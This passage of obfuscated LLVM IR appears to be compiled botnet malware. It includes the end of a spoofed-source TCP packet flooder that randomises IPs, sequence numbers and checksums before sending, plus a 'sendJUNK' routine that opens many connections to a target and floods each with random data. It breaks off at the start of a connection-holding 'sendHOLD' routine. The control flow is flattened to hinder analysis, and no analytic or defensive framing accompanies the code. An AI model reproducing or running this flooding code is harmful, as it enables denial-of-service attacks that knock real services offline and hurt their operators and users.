  store i16 0, i16* %254, align 4
  %255 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %256 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %255, i32 0, i32 0
  %257 = bitcast %union.anon.0* %256 to %struct.anon.1*
  %258 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %257, i32 0, i32 7
  store i16 0, i16* %258, align 2
  %259 = load i32, i32* %9, align 4
  %260 = icmp eq i32 %259, 0
  %261 = select i1 %260, i32 -651501941, i32 -821214927
  store i32 %261, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  %263 = call i32 @rand_cmwc()
  store i32 -108607863, i32* %switchVar
  store i32 %263, i32* %.reg2mem10
  br label %loopEnd

; <label>:264:                                    ; preds = %loopEntry
  %265 = load i32, i32* %9, align 4
  %266 = trunc i32 %265 to i16
  %267 = call zeroext i16 @htons(i16 zeroext %266) #13
  %268 = zext i16 %267 to i32
  store i32 -108607863, i32* %switchVar
  store i32 %268, i32* %.reg2mem10
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %270 = trunc i32 %.reload11 to i16
  %271 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %272 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %271, i32 0, i32 0
  %273 = bitcast %union.anon.0* %272 to %struct.anon.1*
  %274 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %273, i32 0, i32 1
  store i16 %270, i16* %274, align 2
  %275 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %276 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %277 = call zeroext i16 @tcpcsum(%struct.iphdr* %275, %struct.tcphdr* %276)
  %278 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %279 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %278, i32 0, i32 0
  %280 = bitcast %union.anon.0* %279 to %struct.anon.1*
  %281 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %280, i32 0, i32 6
  store i16 %277, i16* %281, align 4
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %282 = bitcast i8* %.reload8 to i16*
  %283 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %284 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %283, i32 0, i32 2
  %285 = load i16, i16* %284, align 2
  %286 = zext i16 %285 to i32
  %287 = call zeroext i16 @csum(i16* %282, i32 %286)
  %288 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %289 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %288, i32 0, i32 7
  store i16 %287, i16* %289, align 2
  %290 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %291 = load i32, i32* %10, align 4
  %292 = add nsw i32 %290, %291
  store i32 %292, i32* %24, align 4
  store i32 0, i32* %25, align 4
  store i32 -1332382653, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  store i32 -1802167360, i32* %switchVar
  br label %loopEnd

; <label>:294:                                    ; preds = %loopEntry
  %295 = load i32, i32* %17, align 4
  %296 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %297 = call i64 @sendto(i32 %295, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %296, i32 16)
  %298 = load i32, i32* %19, align 4
  %299 = call i32 @getRandomIP(i32 %298)
  %300 = call i32 @htonl(i32 %299) #13
  %301 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %302 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %301, i32 0, i32 8
  store i32 %300, i32* %302, align 4
  %303 = call i32 @rand_cmwc()
  %304 = trunc i32 %303 to i16
  %305 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %306 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %305, i32 0, i32 3
  store i16 %304, i16* %306, align 4
  %307 = call i32 @rand_cmwc()
  %308 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %309 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %308, i32 0, i32 0
  %310 = bitcast %union.anon.0* %309 to %struct.anon.1*
  %311 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %310, i32 0, i32 2
  store i32 %307, i32* %311, align 4
  %312 = call i32 @rand_cmwc()
  %313 = trunc i32 %312 to i16
  %314 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %315 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %314, i32 0, i32 0
  %316 = bitcast %union.anon.0* %315 to %struct.anon.1*
  %317 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %316, i32 0, i32 0
  store i16 %313, i16* %317, align 4
  %318 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %319 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %318, i32 0, i32 0
  %320 = bitcast %union.anon.0* %319 to %struct.anon.1*
  %321 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %320, i32 0, i32 6
  store i16 0, i16* %321, align 4
  %322 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %323 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %324 = call zeroext i16 @tcpcsum(%struct.iphdr* %322, %struct.tcphdr* %323)
  %325 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %326 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %325, i32 0, i32 0
  %327 = bitcast %union.anon.0* %326 to %struct.anon.1*
  %328 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %327, i32 0, i32 6
  store i16 %324, i16* %328, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %329 = bitcast i8* %.reload6 to i16*
  %330 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %331 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %330, i32 0, i32 2
  %332 = load i16, i16* %331, align 2
  %333 = zext i16 %332 to i32
  %334 = call zeroext i16 @csum(i16* %329, i32 %333)
  %335 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i32 0, i32 7
  store i16 %334, i16* %336, align 2
  %337 = load i32, i32* %25, align 4
  %338 = load i32, i32* %15, align 4
  %339 = icmp eq i32 %337, %338
  %340 = select i1 %339, i32 37498815, i32 -1883641364
  store i32 %340, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  %342 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %343 = load i32, i32* %24, align 4
  %344 = icmp sgt i32 %342, %343
  %345 = select i1 %344, i32 1858699708, i32 482155102
  store i32 %345, i32* %switchVar
  br label %loopEnd

; <label>:346:                                    ; preds = %loopEntry
  store i32 -2010361980, i32* %switchVar
  br label %loopEnd

; <label>:347:                                    ; preds = %loopEntry
  store i32 0, i32* %25, align 4
  store i32 -1332382653, i32* %switchVar
  br label %loopEnd

; <label>:348:                                    ; preds = %loopEntry
  %349 = load i32, i32* %25, align 4
  %350 = add i32 %349, 1
  store i32 %350, i32* %25, align 4
  store i32 -1332382653, i32* %switchVar
  br label %loopEnd

; <label>:351:                                    ; preds = %loopEntry
  %352 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %352)
  store i32 561798387, i32* %switchVar
  br label %loopEnd

; <label>:353:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %351, %348, %347, %346, %341, %294, %293, %269, %264, %262, %244, %243, %241, %240, %239, %238, %237, %233, %225, %220, %212, %207, %199, %194, %186, %181, %173, %168, %164, %161, %125, %77, %71, %70, %66, %63, %57, %54, %47, %46, %40, %35, %31, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendJUNK(i8*, i32, i32) #0 {
  %.reg2mem27 = alloca i32
  %.reg2mem6 = alloca %struct.state_t*
  %.reg2mem = alloca i32
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %20 = call i32 @getdtablesize() #2
  %21 = sdiv i32 %20, 2
  store i32 %21, i32* %7, align 4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %22, align 4
  %23 = load i32, i32* %5, align 4
  %24 = trunc i32 %23 to i16
  %25 = call zeroext i16 @htons(i16 zeroext %24) #13
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %25, i16* %26, align 2
  %27 = load i8*, i8** %4, align 8
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %29 = call i32 @getHost(i8* %27, %struct.in_addr* %28)
  store i32 %29, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1395877271, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar5 = load i32, i32* %switchVar
  switch i32 %switchVar5, label %switchDefault [
    i32 1395877271, label %first
    i32 -1770877148, label %32
    i32 -477119123, label %33
    i32 -1781404354, label %49
    i32 1546575637, label %54
    i32 117011889, label %55
    i32 2027492233, label %60
    i32 599686393, label %NodeBlock3
    i32 -1921823206, label %NodeBlock
    i32 -1235357975, label %LeafBlock1
    i32 -1537129441, label %LeafBlock
    i32 1116575944, label %71
    i32 -309245106, label %99
    i32 -177230252, label %104
    i32 -1322411218, label %111
    i32 1180703331, label %116
    i32 1170461021, label %117
    i32 1555494922, label %118
    i32 1576304873, label %127
    i32 792527192, label %128
    i32 -993618283, label %160
    i32 1784813681, label %171
    i32 1763122510, label %182
    i32 783473645, label %187
    i32 -264324803, label %188
    i32 495948808, label %192
    i32 624318160, label %203
    i32 236857248, label %204
    i32 -562351966, label %205
    i32 -524935786, label %216
    i32 -831550330, label %221
    i32 -340916462, label %232
    i32 -1057770647, label %NewDefault
    i32 -1604442225, label %233
    i32 1058250190, label %234
    i32 1151514852, label %237
    i32 1175897745, label %238
    i32 -714656730, label %240
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %30 = icmp ne i32 %.reload, 0
  %31 = select i1 %30, i32 -1770877148, i32 -477119123
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 -714656730, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %35 = getelementptr inbounds [8 x i8], [8 x i8]* %34, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %35, i8 0, i64 8, i32 4, i1 false)
  %36 = load i32, i32* %7, align 4
  %37 = zext i32 %36 to i64
  %38 = call i8* @llvm.stacksave()
  store i8* %38, i8** %10, align 8
  %39 = alloca %struct.state_t, i64 %37, align 16
  store %struct.state_t* %39, %struct.state_t** %.reg2mem6
  %.reload26 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %40 = bitcast %struct.state_t* %.reload26 to i8*
  %41 = load i32, i32* %7, align 4
  %42 = sext i32 %41 to i64
  %43 = mul i64 %42, 5
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 %43, i32 16, i1 false)
  %44 = call noalias i8* @malloc(i64 1024) #2
  store i8* %44, i8** %16, align 8
  %45 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %45, i8 0, i64 1024, i32 1, i1 false)
  %46 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %47 = load i32, i32* %6, align 4
  %48 = add nsw i32 %46, %47
  store i32 %48, i32* %17, align 4
  store i32 -1781404354, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %17, align 4
  %51 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %52 = icmp sgt i32 %50, %51
  %53 = select i1 %52, i32 1546575637, i32 1175897745
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  store i32 0, i32* %8, align 4
  store i32 117011889, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i32, i32* %8, align 4
  %57 = load i32, i32* %7, align 4
  %58 = icmp slt i32 %56, %57
  %59 = select i1 %58, i32 2027492233, i32 1151514852
  store i32 %59, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* %8, align 4
  %62 = sext i32 %61 to i64
  %.reload25 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %63 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload25, i64 %62
  %64 = getelementptr inbounds %struct.state_t, %struct.state_t* %63, i32 0, i32 1
  %65 = load i8, i8* %64, align 4
  %66 = zext i8 %65 to i32
  store i32 %66, i32* %.reg2mem27
  store i32 599686393, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload31 = load volatile i32, i32* %.reg2mem27
  %Pivot4 = icmp slt i32 %.reload31, 1
  %67 = select i1 %Pivot4, i32 -1537129441, i32 -1921823206
  store i32 %67, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload29 = load volatile i32, i32* %.reg2mem27
  %Pivot = icmp slt i32 %.reload29, 2
  %68 = select i1 %Pivot, i32 1170461021, i32 -1235357975
  store i32 %68, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload28 = load volatile i32, i32* %.reg2mem27
  %SwitchLeaf2 = icmp eq i32 %.reload28, 2
  %69 = select i1 %SwitchLeaf2, i32 -562351966, i32 -1057770647
  store i32 %69, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload30 = load volatile i32, i32* %.reg2mem27
  %SwitchLeaf = icmp eq i32 %.reload30, 0
  %70 = select i1 %SwitchLeaf, i32 1116575944, i32 -1057770647
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %73 = load i32, i32* %8, align 4
  %74 = sext i32 %73 to i64
  %.reload24 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %75 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload24, i64 %74
  %76 = getelementptr inbounds %struct.state_t, %struct.state_t* %75, i32 0, i32 0
  store i32 %72, i32* %76, align 8
  %77 = load i32, i32* %8, align 4
  %78 = sext i32 %77 to i64
  %.reload23 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %79 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload23, i64 %78
  %80 = getelementptr inbounds %struct.state_t, %struct.state_t* %79, i32 0, i32 0
  %81 = load i32, i32* %80, align 8
  %82 = load i32, i32* %8, align 4
  %83 = sext i32 %82 to i64
  %.reload22 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %84 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload22, i64 %83
  %85 = getelementptr inbounds %struct.state_t, %struct.state_t* %84, i32 0, i32 0
  %86 = load i32, i32* %85, align 8
  %87 = call i32 (i32, i32, ...) @fcntl(i32 %86, i32 3, i8* null)
  %88 = or i32 %87, 2048
  %89 = call i32 (i32, i32, ...) @fcntl(i32 %81, i32 4, i32 %88)
  %90 = load i32, i32* %8, align 4
  %91 = sext i32 %90 to i64
  %.reload21 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %92 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload21, i64 %91
  %93 = getelementptr inbounds %struct.state_t, %struct.state_t* %92, i32 0, i32 0
  %94 = load i32, i32* %93, align 8
  %95 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %96 = call i32 @connect(i32 %94, %struct.sockaddr* %95, i32 16)
  %97 = icmp ne i32 %96, -1
  %98 = select i1 %97, i32 -177230252, i32 -309245106
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = call i32* @__errno_location() #13
  %101 = load i32, i32* %100, align 4
  %102 = icmp ne i32 %101, 115
  %103 = select i1 %102, i32 -177230252, i32 -1322411218
  store i32 %103, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = load i32, i32* %8, align 4
  %106 = sext i32 %105 to i64
  %.reload20 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %107 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload20, i64 %106
  %108 = getelementptr inbounds %struct.state_t, %struct.state_t* %107, i32 0, i32 0
  %109 = load i32, i32* %108, align 8
  %110 = call i32 @close(i32 %109)
  store i32 1180703331, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i32, i32* %8, align 4
  %113 = sext i32 %112 to i64
  %.reload19 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %114 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload19, i64 %113
  %115 = getelementptr inbounds %struct.state_t, %struct.state_t* %114, i32 0, i32 1
  store i8 1, i8* %115, align 4
  store i32 1180703331, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  store i32 -1604442225, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  store i32 1555494922, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %120 = getelementptr inbounds [16 x i64], [16 x i64]* %119, i64 0, i64 0
  %121 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %120) #2, !srcloc !6
  %122 = extractvalue { i64, i64* } %121, 0
  %123 = extractvalue { i64, i64* } %121, 1
  %124 = trunc i64 %122 to i32
  store i32 %124, i32* %18, align 4
  %125 = ptrtoint i64* %123 to i64
  %126 = trunc i64 %125 to i32
  store i32 %126, i32* %19, align 4
  store i32 1576304873, i32* %switchVar
  br label %loopEnd

; <label>:127:                                    ; preds = %loopEntry
  store i32 792527192, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  %129 = load i32, i32* %8, align 4
  %130 = sext i32 %129 to i64
  %.reload18 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %131 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload18, i64 %130
  %132 = getelementptr inbounds %struct.state_t, %struct.state_t* %131, i32 0, i32 0
  %133 = load i32, i32* %132, align 8
  %134 = srem i32 %133, 64
  %135 = zext i32 %134 to i64
  %136 = shl i64 1, %135
  %137 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %138 = load i32, i32* %8, align 4
  %139 = sext i32 %138 to i64
  %.reload17 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %140 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload17, i64 %139
  %141 = getelementptr inbounds %struct.state_t, %struct.state_t* %140, i32 0, i32 0
  %142 = load i32, i32* %141, align 8
  %143 = sdiv i32 %142, 64
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds [16 x i64], [16 x i64]* %137, i64 0, i64 %144
  %146 = load i64, i64* %145, align 8
  %147 = or i64 %146, %136
  store i64 %147, i64* %145, align 8
  %148 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %148, align 8
  %149 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %149, align 8
  %150 = load i32, i32* %8, align 4
  %151 = sext i32 %150 to i64
  %.reload16 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %152 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload16, i64 %151
  %153 = getelementptr inbounds %struct.state_t, %struct.state_t* %152, i32 0, i32 0
  %154 = load i32, i32* %153, align 8
  %155 = add nsw i32 %154, 1
  %156 = call i32 @select(i32 %155, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %156, i32* %15, align 4
  %157 = load i32, i32* %15, align 4
  %158 = icmp eq i32 %157, 1
  %159 = select i1 %158, i32 -993618283, i32 -264324803
  store i32 %159, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  store i32 4, i32* %13, align 4
  %161 = load i32, i32* %8, align 4
  %162 = sext i32 %161 to i64
  %.reload15 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %163 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload15, i64 %162
  %164 = getelementptr inbounds %struct.state_t, %struct.state_t* %163, i32 0, i32 0
  %165 = load i32, i32* %164, align 8
  %166 = bitcast i32* %14 to i8*
  %167 = call i32 @getsockopt(i32 %165, i32 1, i32 4, i8* %166, i32* %13) #2
  %168 = load i32, i32* %14, align 4
  %169 = icmp ne i32 %168, 0
  %170 = select i1 %169, i32 1784813681, i32 1763122510
  store i32 %170, i32* %switchVar
  br label %loopEnd

; <label>:171:                                    ; preds = %loopEntry
  %172 = load i32, i32* %8, align 4
  %173 = sext i32 %172 to i64
  %.reload14 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %174 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload14, i64 %173
  %175 = getelementptr inbounds %struct.state_t, %struct.state_t* %174, i32 0, i32 0
  %176 = load i32, i32* %175, align 8
  %177 = call i32 @close(i32 %176)
  %178 = load i32, i32* %8, align 4
  %179 = sext i32 %178 to i64
  %.reload13 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %180 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload13, i64 %179
  %181 = getelementptr inbounds %struct.state_t, %struct.state_t* %180, i32 0, i32 1
  store i8 0, i8* %181, align 4
  store i32 783473645, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %183 = load i32, i32* %8, align 4
  %184 = sext i32 %183 to i64
  %.reload12 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %185 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload12, i64 %184
  %186 = getelementptr inbounds %struct.state_t, %struct.state_t* %185, i32 0, i32 1
  store i8 2, i8* %186, align 4
  store i32 783473645, i32* %switchVar
  br label %loopEnd

; <label>:187:                                    ; preds = %loopEntry
  store i32 236857248, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  %189 = load i32, i32* %15, align 4
  %190 = icmp eq i32 %189, -1
  %191 = select i1 %190, i32 495948808, i32 624318160
  store i32 %191, i32* %switchVar
  br label %loopEnd

; <label>:192:                                    ; preds = %loopEntry
  %193 = load i32, i32* %8, align 4
  %194 = sext i32 %193 to i64
  %.reload11 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %195 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload11, i64 %194
  %196 = getelementptr inbounds %struct.state_t, %struct.state_t* %195, i32 0, i32 0
  %197 = load i32, i32* %196, align 8
  %198 = call i32 @close(i32 %197)
  %199 = load i32, i32* %8, align 4
  %200 = sext i32 %199 to i64
  %.reload10 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %201 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload10, i64 %200
  %202 = getelementptr inbounds %struct.state_t, %struct.state_t* %201, i32 0, i32 1
  store i8 0, i8* %202, align 4
  store i32 624318160, i32* %switchVar
  br label %loopEnd

; <label>:203:                                    ; preds = %loopEntry
  store i32 236857248, i32* %switchVar
  br label %loopEnd

; <label>:204:                                    ; preds = %loopEntry
  store i32 -1604442225, i32* %switchVar
  br label %loopEnd

; <label>:205:                                    ; preds = %loopEntry
  %206 = load i8*, i8** %16, align 8
  call void @makeRandomStr(i8* %206, i32 1024)
  %207 = load i32, i32* %8, align 4
  %208 = sext i32 %207 to i64
  %.reload9 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %209 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload9, i64 %208
  %210 = getelementptr inbounds %struct.state_t, %struct.state_t* %209, i32 0, i32 0
  %211 = load i32, i32* %210, align 8
  %212 = load i8*, i8** %16, align 8
  %213 = call i64 @send(i32 %211, i8* %212, i64 1024, i32 16384)
  %214 = icmp eq i64 %213, -1
  %215 = select i1 %214, i32 -524935786, i32 -340916462
  store i32 %215, i32* %switchVar
  br label %loopEnd

; <label>:216:                                    ; preds = %loopEntry
  %217 = call i32* @__errno_location() #13
  %218 = load i32, i32* %217, align 4
  %219 = icmp ne i32 %218, 11
  %220 = select i1 %219, i32 -831550330, i32 -340916462
  store i32 %220, i32* %switchVar
  br label %loopEnd

; <label>:221:                                    ; preds = %loopEntry
  %222 = load i32, i32* %8, align 4
  %223 = sext i32 %222 to i64
  %.reload8 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %224 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload8, i64 %223
  %225 = getelementptr inbounds %struct.state_t, %struct.state_t* %224, i32 0, i32 0
  %226 = load i32, i32* %225, align 8
  %227 = call i32 @close(i32 %226)
  %228 = load i32, i32* %8, align 4
  %229 = sext i32 %228 to i64
  %.reload7 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %230 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload7, i64 %229
  %231 = getelementptr inbounds %struct.state_t, %struct.state_t* %230, i32 0, i32 1
  store i8 0, i8* %231, align 4
  store i32 -340916462, i32* %switchVar
  br label %loopEnd

; <label>:232:                                    ; preds = %loopEntry
  store i32 -1604442225, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 -1604442225, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  store i32 1058250190, i32* %switchVar
  br label %loopEnd

; <label>:234:                                    ; preds = %loopEntry
  %235 = load i32, i32* %8, align 4
  %236 = add nsw i32 %235, 1
  store i32 %236, i32* %8, align 4
  store i32 117011889, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  store i32 -1781404354, i32* %switchVar
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  %239 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %239)
  store i32 -714656730, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %238, %237, %234, %233, %NewDefault, %232, %221, %216, %205, %204, %203, %192, %188, %187, %182, %171, %160, %128, %127, %118, %117, %116, %111, %104, %99, %71, %LeafBlock, %LeafBlock1, %NodeBlock, %NodeBlock3, %60, %55, %54, %49, %33, %32, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @sendHOLD(i8*, i32, i32) #0 {
  %.reg2mem29 = alloca i32
  %.reg2mem6 = alloca %struct.state_t*
  %.reg2mem = alloca i32
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %22 = call i32 @getdtablesize() #2
  %23 = sdiv i32 %22, 2
  store i32 %23, i32* %7, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %5, align 4
  %26 = trunc i32 %25 to i16
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = load i8*, i8** %4, align 8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %31 = call i32 @getHost(i8* %29, %struct.in_addr* %30)
  store i32 %31, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1617940540, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
